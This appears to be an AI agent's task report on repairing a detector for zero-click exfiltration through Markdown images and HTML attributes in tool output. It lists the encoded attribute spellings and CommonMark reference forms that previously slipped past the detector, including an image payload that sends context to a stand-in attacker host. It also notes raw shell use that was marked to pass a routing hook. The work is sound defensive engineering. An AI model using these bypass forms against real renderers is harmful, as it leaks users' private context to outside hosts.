STATUS: DONE_WITH_CONCERNS

# T71 — closing T66#F-001, T66#F-002 and T66#F-003 on the auto-fetch floor

All three defects were re-measured on the CURRENT tree before anything was edited. `exfil.ts` had
been rewritten by T67 after T66 measured it (T66#F-010), so the reviewer's line numbers were checked
rather than assumed; all three landed on the same lines, and all three reproduced.

| File | SHA-256 before | SHA-256 after | Lines |
|---|---|---|---|
| `src/security/detect/exfil.ts` | `63edcc57c8604ab5e66534ca5c92d30ef0f77d942494d898dc2f07f479ab15cc` | `ef029fe36b4f81f224b4b2de4d5ad21ae724ba06de47c67039a4912091efed8a` | 956 → 1198 |
| `src/security/detect/exfil.test.ts` | `a8f2365b22c595b627feb8da243e203440ac11f35b5d3a16f4d9fa260aed7f11` | `7953c64ea57c470ebc1603897fb0e02c1f4821fed472ba6d7554584a84badd48` | 1089 → 1272 |
| `docs/requirements/keryx-agent-first-core/policies.md` | `61ddb7f61c62588c6f0f805cfcf4014561b98a117c671ed3cfd578bc8c80cfb4` | `024d1d039921c5e840d144b26ae994e85e8bfa8b59eefb9798ed8b45295beb97` | 52 → 56 |

New probe artifacts (this directory): `T71-md-oracle.ts`, `T71-doc-parity.ts`, `T71-perf.ts`.
Nothing else was written. No reviewer probe was modified, no existing test was weakened or removed,
`acceptance-criteria.md` and `flow.json` are untouched, and the three files another worker owns
(`src/security/self-protect.ts`, `service.ts`, `templates.ts`, `src/health/run.ts`) were never opened.

---

## Defect 1 — T66#F-001, blocker: the gates compared the raw attribute value

### Reproduced first

`bun …/T66-gates.ts` on the current file → `gateBypasses` = the same seven ids the reviewer recorded
(`inputTypeDecimalRef`, `inputTypeHexRef`, `inputTypeTrailingRef`, `inputTypeNoSemicolon`,
`metaEquivDecimalRef`, `metaEquivHexRef`, `metaEquivTrailingRef`), each row printing the raw gate
value and its decoding. Raw: `.metaproject/data/gdctx/raw/T71-before-gates.log`.

### Oracle

The probe's own `rendererFetches` column, which `T66-gates.ts` derives from Bun's `HTMLRewriter`
(lol-html), a spec-derived tokenizer with no relationship to this codebase. It attributes
`type="&#105;mage"` to an image submit button and `http-equiv="&#114;efresh"` to a refresh, exactly
as the HTML tokenizer's attribute-value states (§13.2.5.35-.39) require. The four boundaries were
re-measured with `T66-boundary.ts`.

### The change

One comparison, inside `hasAttributeValue` — the helper both gates share
(`src/security/detect/exfil.ts`, ~line 590):

```
-      attribute.name === name && attribute.value.trim().toLowerCase() === expected,
+      attribute.name === name &&
+      decodeCharacterReferences(attribute.value).trim().toLowerCase() === expected,
```

Fixed in the helper rather than at the two call sites deliberately: T66's class was "every gate that
decides on an attribute value rather than an attribute name", and this is that class's single choke
point. Every other branch in the module keys off the attribute NAME, which a tokenizer does not
entity-decode, so the class is closed at two members today and a third gate added later inherits the
fix. This is the consistency the dispatch asked for and not a new mechanism: `renderableUrl` and
`metaRefreshDestination` already decode, a few lines away, for exactly this reason.

Decoding is for CLASSIFICATION only. The caller still masks `attribute.value` at
`attribute.valueStart`, so offsets stay on the bytes as written — pinned by a test that asserts the
redacted vector is byte-for-byte `<input type="&#105;mage" src="[REDACTED:url]">`.

The match stays EXACT after `trim().toLowerCase()`. `http-equiv="refresh&#59;"` decodes to
`refresh;`, which no renderer refreshes on, and it stays released; so does `type="&#105;mages"`. A
prefix or substring test here would have invented a surface instead of describing one.

### Result

`gateBypasses`: **7 → 0**. `gateFalsePositives` is unchanged at `[inputDupTypeTextFirst]` — T66#F-008,
info severity, explicitly out of this dispatch's scope; duplicate resolution stays eager.

---

## Defect 2 — T66#F-002, blocker: three CommonMark image forms were released

### Reproduced first

`bun …/T66-md-oracle.ts` → `bypasses` = the same five ids over three forms (`collapsedReference`,
`shortcutReference`, `shortcutReferenceInProse`, `collapsedUppercaseRef`, `inlineNestedBrackets`),
each rendering `<img src="https://attacker.invalid/p?ctx=CTX">` while `detectExfil` returned 0.
Raw: `T71-before-md-oracle.log`.

### Oracle

`marked` — an independent CommonMark/GFM renderer already in this checkout, offline — used by the
reviewer's probe and by a new one, `T71-md-oracle.ts`, which extends the question from the reviewer's
five rows to the 31 rows where the REPAIR itself could go wrong: the four image spellings and the
four link spellings, the shapes where the two description readings disagree, and nesting depth 1..6.

### The change

`REFERENCE_USE`'s label grammar and `INLINE`'s description grammar are both gone, replaced by a
scanner. The reviewer's suggested regex (`/(!?)\[([^\]]*)\](?:\[([^\]]*)\])?/g`) closes the two
reference forms but not the balanced-bracket description, and any regex that "allows one level of
nesting" would be the same mistake this surface has already made twice — a decoder bounded by digit
count, an extractor bounded by a negated character class, each defeated by writing one more of
whatever was bounded. A renderer counts bracket depth, unbounded, so this counts bracket depth,
unbounded.

- `indexBrackets(content)` pairs every bracket in ONE left-to-right pass with a stack, giving each
  opening `[` its balanced close.
- `descriptionEnds(index, open)` returns up to two candidate ends, most-faithful first: the
  **balanced** end, and the **first `]` at any depth** — which is precisely the span the old
  `[^\]]*` produced. Keeping the second is what makes the change a strict SUPERSET of the previous
  extraction: `![a[](URL)` has no balanced close, and the old span is the one that matches it. No
  over-approximation the 88-case extraction matrix records can therefore vanish, and none did.
- `readBracketConstructs` classifies what follows the description the way CommonMark classifies it:
  `(` ⇒ **inline** (the existing destination grammar, now a sticky regex anchored at that `(`, so it
  can only match where a renderer looks for it); `[` ⇒ **full** reference when the label is non-empty
  and **collapsed** when it is empty; nothing ⇒ **shortcut**. Collapsed and shortcut take the label
  from the description, which is CommonMark's own rule.
- Backslash escapes are deliberately NOT honoured: honouring `\]` would REMOVE current matches
  (`![a\](URL)` is flagged today and renders no image), and this floor may not move that way.
- The two passes stay separate loops in the same order (inline, then reference, then HTML). Merging
  them would reorder `matches` for a document carrying both, and match order is observable.
- The reference pass SKIPS a construct that has an inline destination, so `![a](URL)` does not also
  register `[a]` as a shortcut use — an inline destination wins over a definition of the same label,
  as CommonMark resolves it. Pinned by a test.
- The `!` gate is unchanged and load-bearing: `[a]`, `[a][]` and `[a][ref]` stay released, and so
  does a reference DEFINITION line, which is itself a shortcut-shaped bracket run carrying no `!`.

### One bound, and it is the standard's

`MAX_REFERENCE_LABEL = 999` — *"A link label can have at most 999 characters inside the square
brackets"* (CommonMark, Link reference definitions). A longer bracket run cannot be a label in any
conformant renderer, so refusing to read one as a label is renderer-faithful rather than a shortcut.
Nothing about the DESTINATION grammar is bounded by it, and the unbounded-nesting test pins that.

### A performance defect the repair introduced, found and fixed before shipping

The first implementation walked depth per opening bracket. That is quadratic on a run of `[`, and
200 000 of them — 200 KB an attacker can paste into any tool output — took **207 869 ms** inside the
mandatory floor (`T71-perf.log`). The `[^\]]*` it replaces is quadratic on the same input too
(**42 106 ms** across its two patterns, measured standalone in
`T71-perf-before-old-patterns.log`), so this is a pre-existing shape rather than one the repair
invented — but the repair is not allowed to make it five times worse. The one-pass bracket index and
the label bound bring the same input to **36.6 ms** (`T71-perf-after.log`), and the slowest of the
eight shapes to 98.3 ms. This is disclosed rather than buried because it is the kind of finding a
reviewer should not have to make twice.

### Result

`T66-md-oracle.ts` bypasses **5 → 0**, false positives 0 → 0. `T71-md-oracle.ts`: 31 cases,
**0 bypasses**, `clickGatedControlsReleased: true`, `everyDepthFlagged: true`, and 7
over-approximations — 2 of them pre-existing and unchanged (`unbalancedOpen`, `escapedClose`) and 5
of them the depth-2..6 rows, which `marked`'s own parser does not resolve. Those five are recorded as
over-approximation, NOT as oracle-confirmed fetches: a depth bound is the failure this repair exists
to avoid, so erring toward flagging past the oracle's own limit is the intended direction and is
labelled as such rather than dressed up as a renderer claim.

---

## Defect 3 — T66#F-003, major: the normative subsection, corrected in both directions

`docs/requirements/keryx-agent-first-core/policies.md`, `### Auto-fetch floor: покрытая и непокрытая
область`. `Version:` `0.1.2 → 0.1.3` — the line is outside the subsection, and it is changed on the
convention T46 established that a content change to the subsection bumps the document; disclosed
here rather than assumed. The credential-locator sentence in §Redaction is NOT touched.

### (a) Completeness — the covered list

**Before:**

> **Покрыто** (перечень полный, не пример): markdown image `![alt](URL)` и reference definition
> `[ref]: URL`; `<img|image src|srcset>`, …

**After:**

> **Покрыто** (перечень полный, не пример): markdown image во всех четырёх написаниях CommonMark —
> inline `![alt](URL)`, включая описание с парными скобками (`![a[b]c](URL)`), full reference
> `![alt][ref]`, collapsed `![alt][]` и shortcut `![alt]` — вместе с их reference definition
> `[ref]: URL`; `<img|image src|srcset>`, …

and a new paragraph after it:

> Markdown **link** — и inline `[text](URL)`, и reference во всех трёх написаниях (`[text][ref]`,
> `[text][]`, `[text]`) — этим floor не покрыт: переход требует клика, поэтому это не zero-click
> fetch. Inline-ссылка остаётся предметом отдельной нормы выше (чувствительное значение в
> query/path), а не auto-fetch floor. Значения двух атрибутных gate — `type=image` у `<input>` и
> `http-equiv=refresh` у `<meta>` — сравниваются после декодирования character references, как их
> декодирует renderer, поэтому написание `type="&#105;mage"` покрыто наравне с `type=image`.

*«Перечень полный»* stays, because after §1 and §2 it is true — which is the condition T66 attached
to keeping it.

### (b) Context exceptions — one named where there are three

**Before:**

> Покрытие определяется по имени элемента и атрибута в исходном тексте, без учёта вложенности и
> контекста, поэтому конструкция, процитированная в HTML-комментарии, кодовом блоке или
> `<template>`, тоже может стать finding. Исключение сделано только для `<base href>`, где ложное
> срабатывание меняет разрешение всего документа, а не одного destination.

**After** (two paragraphs; the case-insensitivity clause of (c) is folded into the first):

> Покрытие определяется по имени элемента и атрибута в исходном тексте. Имена сопоставляются
> ASCII-регистронезависимо, как их сопоставляет сам HTML, поэтому покрыт и процитированный
> компонентный markup с теми же именами — `<Video src>`, `<Iframe src>`, `<Embed src>` в `.tsx` или
> MDX: область шире, чем читается по списку элементов, и средство против ложного срабатывания здесь
> то же, что и для `<img src>` в README, — allowlist. Вложенность и контекст не учитываются, поэтому
> конструкция, процитированная в HTML-комментарии, кодовом блоке или `<template>`, тоже становится
> finding.
>
> Отступлений от этой контекстной слепоты ровно три, и два из них **сужают** область, а не
> расширяют. Первое: markup, написанный внутри закавыченного значения чужого атрибута, намеренно не
> является finding — для любого конформного парсера это значение атрибута, а не start tag, и
> renderer его не запрашивает. Второе: незакрытое закавыченное значение поглощает остаток фрагмента,
> и всё после него не проверяется — так же поступает с ним и конформный tokenizer. Третье —
> `<base href>`: он не исключён из проверки и фиксируется везде, где встречается, но именно у него
> цена ложного срабатывания — разрешение всего документа, а не одного destination; она сообщается
> вызывающей стороне в remediation самого finding, а не гасится здесь.

The `<base href>` entry is corrected as well as counted. The old wording called it an *exception* to
context blindness; it is not one — the element is flagged wherever it appears, which is the whole
point of the T62#F-001 revert. What is special about it is the COST, and the new wording says that.

### (c) Case-insensitivity

Added as the second clause of the first paragraph above — coverage WIDER than the element list
reads, which is the direction the dispatch asked about, with the measured carrier named
(`<Video src>` / `<Iframe src>` / `<Embed src>` in a quoted `.tsx` or MDX) and the allowlist named as
its remedy.

### The same three corrections in the module

`exfil.ts:41-63` was T66#F-003's third site and had the same two omissions. Its covered list now
names the four image spellings and the released reference-link forms, and a new *"HOW the covered
list is matched, in both directions"* block states case-insensitivity, gate decoding, and the three
departures from context blindness with the same reading of `<base href>`.

### Checked mechanically, not by eye

`T71-doc-parity.ts` (new) transcribes the subsection's covered and released lists into fragments and
asks the DETECTOR, not the table, which of them fire, plus 16 property rows for the three statements
about how matching works:

> `coveredRows: 33, releasedRows: 23, propertyRows: 16, docSaysCoveredButReleased: [],
> docSaysReleasedButFlagged: [], propertyFailures: [], parity: true`

Raw: `.metaproject/data/gdctx/raw/T71-doc-parity.log`.

---

## Verification — exact counts, before and after, with raw log paths

Probes ran **directly with `bun`**, not through `ctx run`, for the reason every prior round on this
surface disclosed and which holds here: `ctx run`'s compaction elides the per-case rows that are the
evidence. The one required focused-suite run went through `ctx run` as the dispatch specifies. All
raw logs under `/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/`.

No network, no model call, no git or flow-state change, no dependency or lockfile change, no
`bun test` without file arguments. Every host is reserved or synthetic (`attacker.invalid`,
`other.invalid`, `cdn.example.org`, `cdn.trusted.example`); nothing was contacted.

### The reviewer's three probes, unmodified

| Probe | Before | After | Raw (before / after) |
|---|---|---|---|
| `T66-gates.ts` (23 gate cases + 9 Part B rows) | `gateBypasses: 7` — `[inputTypeDecimalRef, inputTypeHexRef, inputTypeTrailingRef, inputTypeNoSemicolon, metaEquivDecimalRef, metaEquivHexRef, metaEquivTrailingRef]`; `gateFalsePositives: [inputDupTypeTextFirst]` | **`gateBypasses: []`**; `gateFalsePositives: [inputDupTypeTextFirst]` (unchanged — T66#F-008, out of scope) | `T71-before-gates.log` / `T71-after-gates.log` |
| `T66-md-oracle.ts` (10 cases) | `bypasses: 5` — `[collapsedReference, shortcutReference, shortcutReferenceInProse, collapsedUppercaseRef, inlineNestedBrackets]`; `falsePositives: []` | **`bypasses: []`**, `falsePositives: []` | `T71-before-md-oracle.log` / `T71-after-md-oracle.log` |
| `T66-boundary.ts` (32 shapes × 4 boundaries) | `hostileLeakingCount: 7`; `leakingWithStateNone: 7`; `hostileFullyClosed: 17` | **`hostileLeakingCount: 0`**, **`leakingWithStateNone: []`**, `hostileFullyClosed: 24`; `benignNewlyFlagged` and `benignUntouched` **unchanged** | `T71-before-boundary.log` / `T71-after-boundary.log` |

All seven attribute spellings and all three markdown forms are now findings at the detector AND at
`dispatchCallTool`, `prepareOutputForPersistence`, `validateOutputForTransport` and
`redactToolOutput`, with `isError:false`, `state:"redacted"` and no attacker host released.

### Every prior matrix — eleven, all byte-identical

Each was run against the tree before the first edit and again after the last one, and the logs were
compared programmatically. All eleven are **byte-identical**, including the two the dispatch names
explicitly (the canonicalization and persistence boundary rows).

| Matrix | Result, before and after | Raw (before / after) |
|---|---|---|
| `T42-exfil-attack.ts` (42 cases) | `bypasses: [], falsePositives: [], unconditional: [], conditionalOnRendererScheme: []` | `T71-before-T42-exfil-attack.log` / `T71-after-…` |
| `T24-recheck2-exfil.ts` (48 cases) | `cases=48 bypasses=0 falsePositives=0` | `T71-before-T24-recheck2-exfil.log` / `T71-after-…` |
| `T42-charrefs.ts` (48 names × 5 = 240) | `namedSpellingBypasses: [], numericSpellingBypasses: [], absentButUrlSyntax: []` | `T71-before-T42-charrefs.log` / `T71-after-…` |
| `T53-extract.ts` (88 cases) | `bypasses: 0, overApproximations: 14` — the same 14 ids | `T71-before-T53-extract.log` / `T71-after-…` |
| `T53-resolve.ts` (41 × 15 = 615) | `bypasses: 0, falsePositives: 0` | `T71-before-T53-resolve.log` / `T71-after-…` |
| `T53-base.ts` (23 cases) | `hostileNotNeutralized: 0`; `benignFlaggedIds: [g05, g06, g07, g08]` | `T71-before-T53-base.log` / `T71-after-…` |
| `T53-boundary.ts` (26 shapes) | `hostileLeakingAtAnyBoundary: 0`; `benignNotByteIdenticalIds: [ctlCdnBaseDoc]` | `T71-before-T53-boundary.log` / `T71-after-…` |
| **`T42-boundary.ts` (rows 1–3, canonicalization + persistence signal)** | `signalMatrix` and every row **equal character-for-character** | `T71-before-T42-boundary.log` / `T71-after-…` |
| **`T24-recheck2-boundary.ts` (28 MCP cases)** | 0 leaking at any boundary; every reason token unchanged | `T71-before-T24-recheck2-boundary.log` / `T71-after-…` |
| `T52-base.ts` (14 cases) | `notNeutralized: [], falsePositives: []`; 10 reachable before redaction, 0 after | `T71-before-T52-base.log` / `T71-after-…` |
| `T46-surfaces.ts` (44 rows, 4 boundaries) | `fetchingRows: 36, releasedFetchingCount: 15` — the same deferred set; `flaggedNonFetching: [X04.templateImg]`; `benignControlsFlagged: []` | `T71-before-T46-surfaces.log` / `T71-after-…` |

`T53-base`'s benign set is `[g05, g06, g07, g08]` rather than T66's recorded `[g05, g06]`, and Part B
below flags 7 rather than T66's 6. Both differences predate this task: they are T67's revert of the
`<base>` inert-span suppression, which makes a base element inside a fence or comment a finding
again. The **before** column above is the current tree's own measurement, and after equals before.

### The benign corpus — before and after

`T53-corpus.ts` (the reviewer's, unmodified, real detector), raw `T71-before-T53-corpus.log` /
`T71-after-T53-corpus.log`:

| | Before | After |
|---|---|---|
| files scanned | 22 505 | 22 626 (this task added probes and logs) |
| **benign files with findings** | **16** | **16** — the same 16 files, the same policy ids |
| benign findings | 60 | **60** |
| total findings | 530 | 545 |
| files with findings | 74 | 76 |
| new policy id in benign content | — | **none** |
| Part B (30 synthetic benign shapes) | 7 flagged | **7 flagged, the same 7 ids** — `readmeBadge`, `readmeBadgeAllowlisted`, `codeFenceRemoteImgExample`, `codeFenceBaseExample`, `htmlCommentImg`, `scriptStringImg`, `markdownRefDefRemote` |

**The benign corpus count is unchanged: 16 before, 16 after.** All 15 additional findings and both
additional files are this task's own test file, probes and logs. The shortcut-reference form is the
ordinary README badge shape, so widening to it could only push the benign count up; measured, it did
not — this repository's READMEs use the inline form, which was already covered. No net was widened
beyond the two blockers, and no new benign carrier was accepted.

### New probes

- `T71-md-oracle.ts` — 31 cases against `marked`: `bypasses: []`, `clickGatedControlsReleased: true`,
  `everyDepthFlagged: true`, `overApproximations: [unbalancedOpen, escapedClose, depth2…depth6]`
  (2 pre-existing, 5 past the oracle's own depth limit and flagged on purpose).
  Raw `T71-md-oracle.log`.
- `T71-doc-parity.ts` — `parity: true` over 33 covered, 23 released and 16 property rows.
  Raw `T71-doc-parity.log`.
- `T71-perf.ts` — 8 shapes. First implementation: `openBracketRun200k` **207 869.2 ms**
  (`T71-perf.log`). Shipped implementation: **36.6 ms**, slowest shape 98.3 ms
  (`T71-perf-after.log`). The patterns this replaces, on the same input: **42 105.5 ms**
  (`T71-perf-before-old-patterns.log`).

### Tests — RED before, GREEN after

`bun test src/security/detect/exfil.test.ts`:

| | Before the fix (new tests, old detector) | After |
|---|---|---|
| tests | 51 | 51 |
| pass | 46 | **51** |
| fail | **5** | **0** |
| expect() | — | 682 |

The five that failed, each written before the corresponding line of production code:

```
(fail) T71#F-001: the type=image and http-equiv=refresh gates read the value a renderer reads
(fail) T71#F-002: every CommonMark image spelling a renderer auto-fetches is a finding
(fail) T71#F-002: the balanced-bracket description is unbounded, not bounded
(fail) T71: the persistence materializer never writes an auto-fetch host for the T66 blockers
(fail) T71: the transport validator reports every T66 blocker as redacted with the host gone
```

No existing test was modified, weakened or removed: 46 of 46 pre-existing tests passed before and
after.

### Required suites, types, lint

`bun src/cli.ts ctx run -- bun test src/security/detect/exfil.test.ts
src/security/output-validation.test.ts src/mcp/structural-redaction.test.ts
src/security/persistence-sinks.test.ts`

| | Before | After |
|---|---|---|
| pass | 97 | **102** |
| fail | 0 | **0** |
| expect() | 865 | **980** |

Raw before `.metaproject/data/gdctx/raw/2026-09-06T18-04-24-363Z_run.log` (exit 0); after
`.metaproject/data/gdctx/raw/2026-09-06T18-26-03-968Z_run.log` (exit 0).

- `bun run typecheck` (`tsc --noEmit`) — exit 0, no diagnostics. Raw `T71-after-typecheck.log`.
- `bunx eslint src/security/detect/exfil.ts src/security/detect/exfil.test.ts
  docs/requirements/keryx-agent-first-core/policies.md` — exit 0, 0 errors; the Markdown file is
  reported "ignored because no matching configuration was supplied", stated so the omission is not
  silent. Raw `T71-after-eslint.log`.
- `bunx eslint` on the three new probes — exit 0, all three outside the lint scope
  ("File ignored because of a matching ignore pattern"). Raw `T71-after-eslint-probes.log`.

### Acceptance criteria

- **AC5 (AFC-15) — met.** No field-name or spelling bypass survives: the seven gate spellings and the
  three markdown forms are closed, `T42-charrefs` (240 cases) and `T53-extract` (88 cases) are
  unchanged at 0 bypasses, and `T24-recheck2-boundary`'s field-name rows are byte-identical. A URL
  secret is masked — `egress.markdown-link-sensitive-value` still fires 3 times across the corpus and
  the boundary matrix's `p.password-key` row is unchanged. A public Markdown link is not treated as a
  network send — `ctlPublicLink` and `fpPublicLink` are `state:"none"` and byte-identical at all four
  boundaries, and the new markdown tests additionally pin all four LINK spellings released.
- **Every prior measurement holds** — the eleven matrices above are byte-identical, the
  character-reference and surface matrices included, and so are the boundary rows for the
  canonicalization and persistence repairs.
- **The normative subsection matches the implementation exactly in both directions** —
  `T71-doc-parity.ts`, `parity: true`, 0 mismatches in either direction over 56 fragment rows and 16
  property rows.
- **Benign corpus: 16 before, 16 after.**

---

## Concerns

1. **The depth-2..6 rows are over-approximation, not oracle-confirmed coverage.** `marked` resolves
   only one level of bracket nesting in a description, so no oracle in this checkout can confirm that
   a renderer fetches `![a[[x]]b](URL)`. The detector flags them because the alternative is a depth
   bound, which is the exact failure mode this surface has repeated three times. The direction is
   deliberate and is recorded as such in `T71-md-oracle.ts` rather than presented as a renderer
   claim; a future round that wants certainty needs a CommonMark reference implementation as a second
   oracle.
2. **`inputDupTypeTextFirst` remains a false positive** (T66#F-008, info): `<input type=text
   type=image src=…>` is flagged although a conformant tree builder keeps the FIRST duplicate. Out of
   this dispatch's scope and left exactly as it was; it errs toward flagging.
3. **The quadratic bracket scan was a defect this task introduced and then fixed.** It is disclosed
   in full above with all three measurements because a reviewer should be able to check the claim
   rather than take it. The shipped shape is faster than what it replaces on the same input, but the
   floor as a whole is still linear-per-file with no global input bound — that is unchanged by this
   task and is a decision above this file.
4. **The `Version:` line is outside the subsection I own.** It is bumped `0.1.2 → 0.1.3` on T46's own
   convention; if the orchestrator reads the ownership clause more narrowly, it is one line to
   revert, and nothing else in the document was touched.
5. **T66#F-004, F-005, F-006, F-007, F-009 and F-010 are not addressed here** — the dispatch named
   three defects. F-009's pinning gap is incidentally narrowed for the seven blocker rows by
   `T71_CLASS_VECTORS`, but the seven T46 rows it names are still detector-only.

## Routing audit

- `graph_used: no (not-relevant)` — the dispatch named the file set exactly, and the graph answers
  from the last `keryx gdgraph build` while this checkout carries a large uncommitted multi-worker
  change set, so a graph answer could not be quoted as current.
- `wiki_used: no (not-relevant)` — the governing texts are `T66-review.md`, `T46-implementation.md`,
  `policies.md` and the frozen `acceptance-criteria.md`; all were read directly as the dispatch
  required.
- `ctx_used: partial, disclosed` — the one required focused-suite run went through
  `bun src/cli.ts ctx run` (twice, before and after). Probe and regression EXECUTION ran `bun`
  directly, because `ctx run`'s compaction elides the per-case rows that are this task's evidence —
  the same disclosure T46, T53, T63 and T66 each made. Bounded `Read` with `offset`/`limit` and small
  `bun -e` readers were used for every file excerpt.
- `raw_rg_used: no` — no bare `rg`/`grep`/`cat`/`find`/`sed` over project code. One attempted `tail`
  was refused by the routing hook and replaced; two later `tail`/`grep` uses over TEST OUTPUT (not
  project code) carried the `# keryx:raw` marker with the reason, and one `grep` filtered a `git
  status --porcelain` listing rather than code.
